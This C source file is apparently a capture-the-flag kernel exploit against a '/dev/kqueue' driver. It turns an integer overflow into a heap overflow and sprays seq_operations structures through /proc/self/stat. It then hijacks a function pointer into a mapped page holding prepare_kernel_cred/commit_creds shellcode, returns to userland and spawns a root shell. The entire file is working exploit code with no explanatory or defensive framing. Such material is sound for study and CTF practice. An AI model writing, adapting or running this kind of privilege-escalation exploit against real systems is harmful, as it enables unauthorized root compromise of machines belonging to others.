#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <sys/timerfd.h>
#include <sys/xattr.h>

/* constants for the different commands */

#define CREATE_KQUEUE 0xDEADC0DE
#define EDIT_KQUEUE   0xDAADEEEE
#define DELETE_KQUEUE 0xBADDCAFE
#define SAVE          0xB105BABE

/* Global variables for different purposes */

int fd;

/* eflags */

unsigned long user_cs,user_ss,user_rflags,user_sp;

/* Error Function */

void err(char *msg){
    perror(msg);
    exit(EXIT_FAILURE);
}

/* Save State */

void save_state(){
    __asm__(".intel_syntax noprefix;"
            "mov user_cs,cs;"
            "mov user_ss,ss;"
            "mov user_sp,rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;"
            );
    puts("[+] Saved user state");
}

/* Device Open */

void Open(){
    fd = open("/dev/kqueue",O_RDWR);
    if(fd < 0)
        err("[-] Failed to open kqueue");
    printf("[+] kqueue at %d\n",fd);
}

/* Interactive functions */

typedef struct{
    uint32_t max_entries;
    uint16_t data_size;
    uint16_t entry_idx;
    uint16_t queue_idx;
    char* data;
}request_t;

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

void create_kqueue(uint32_t max_entries,uint16_t data_size){
    request_t r;
    r.max_entries = max_entries;
    r.data_size = data_size;
    if(ioctl(fd,CREATE_KQUEUE,&r) < 0)
        err("[-] failed to create_kqueue");
    puts("[+] Add ok");
}

void delete_kqueue(uint16_t queue_idx){
    request_t r;
    r.queue_idx = queue_idx;
    if(ioctl(fd,DELETE_KQUEUE,&r) < 0)
        err("[-] failed to delete_kqueue");
    puts("[+] Delete ok");
}

void edit_kqueue(uint16_t queue_idx,uint16_t entry_idx,char *data){
    request_t r;
    r.queue_idx = queue_idx;
    r.entry_idx = entry_idx;
    r.data = data;
    if(ioctl(fd,EDIT_KQUEUE,&r) < 0)
        err("[-] failed to edit_kqueue");
    puts("[+] Edit ok");
}

void save(uint16_t queue_idx,uint16_t data_size,uint32_t max_entries){
    request_t r;
    r.queue_idx = queue_idx;
    r.max_entries = max_entries;
    r.data_size = data_size;
    if(ioctl(fd,SAVE,&r) < 0)
        err("[-] failed to save");
    puts("[+] Save ok");
}

int fds[0x1000] = {0};

void spray(){
    for(int i=0;i<0x1000;i++){
        fds[i] = open("/proc/self/stat",O_RDONLY);
    }
    int fd1 = open("/proc/self/stat",O_RDONLY);
    int fd2 = open("/proc/self/stat", O_RDONLY);
    close(fd1);
    close(fd2);
	sleep(1);
    puts("[+] Applied heap spray");
}

/* Escalate previleges */

unsigned long user_rip = (unsigned long)get_shell;
void priv_esc(){
    asm(".intel_syntax noprefix;"
        "add rsp,14;"
        "mov rbx,rax;"
        "sub rax,1563103;" //prepare kernel cred
        "xor rdi,rdi;"
        "call rax; mov rdi,rax;"
        "mov rax,rbx;"
        "sub rax,1564191;" //commit cred
        "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
        );
}


void map_page(){
    unsigned char *map_page = 0x8948f000;
    if (mmap((void *)map_page, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0) == MAP_FAILED){
        err("[-] failed to mmap");
    }
    unsigned short offset = 0xff2;
    map_page[0] = 0;
    map_page[0x1020] = 0;
    map_page[offset++] = (unsigned int)priv_esc & 0xff;
    map_page[offset++] = ((unsigned int)priv_esc >> 8) & 0xff;
    map_page[offset++] = (unsigned int)priv_esc >> 16;
    puts("[+] Map page ready to be used");

}

/* Main */

int main(){
    /*  Use the integer overflow to trigger a heap overflow with the 
     *  save functionality.
     *  Idea is to get the save functionality copy controlled bytes from a
     *  userspace pointer in such a way that the overflowing queue partially
     *  overwrites  an seq operations function pointer to point to a gadget
     */
    save_state();
    Open();
    create_kqueue(0xffffffff,0x20);
    map_page();
    unsigned long overwrite_bytes = 0x209f5f;
    unsigned long data[4] = {0};
    for(int i=0;i<4;i++)
        data[i] = (unsigned long)&overwrite_bytes;
    edit_kqueue(0,0,(char *)data);
    //create_kqueue(0xffffffff,0x20); //1
    //create_kqueue(0xffffffff,0x20); //2
    //delete_kqueue(2);
    //delete_kqueue(1); //1 -> 2
    spray();
    save(0,0x20,1);
    create_kqueue(0xffffffff,0x20); //overflowing (get allocation above userspace ptr)
    for(int i=0;i<0x1000;i++)
        close(fds[i]);
    sleep(1);
    spray();
    /* In memory , after spraying , allocations happen from bottom to top 
     * so we first save queue , and then create overflowing queue.
     * This will get our overflowing queue above the saved queue and
     * we can now use oob fake userspace address to copy controlled bytes 
     * to the seq struct
     */
    int fdp = open("/proc/self/stat", O_RDONLY);
    save(1, 3, 1);
    
    //sleep(3);
    for (int i = 0; i < 0x1000; i++)
    {
        read(fds[i], (char *)data, 0x10);
        close(fds[i]);
    }
    read(fdp, (char *)data, 0x10);
    close(fdp);
    //sleep(1);
    
    return 0;
}
